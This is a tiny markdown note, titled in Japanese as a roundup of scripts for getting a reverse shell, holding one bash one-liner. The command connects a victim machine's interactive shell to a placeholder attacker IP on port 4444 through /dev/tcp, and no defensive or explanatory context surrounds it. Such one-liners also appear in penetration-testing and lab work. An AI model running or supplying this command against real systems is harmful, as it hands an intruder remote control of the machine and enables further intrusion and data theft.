# reverse shell取得のためのスクリプトまとめ

```.sh
bash -c "bash -i >& /dev/tcp/<attacker IP>/4444 0>&1"
```
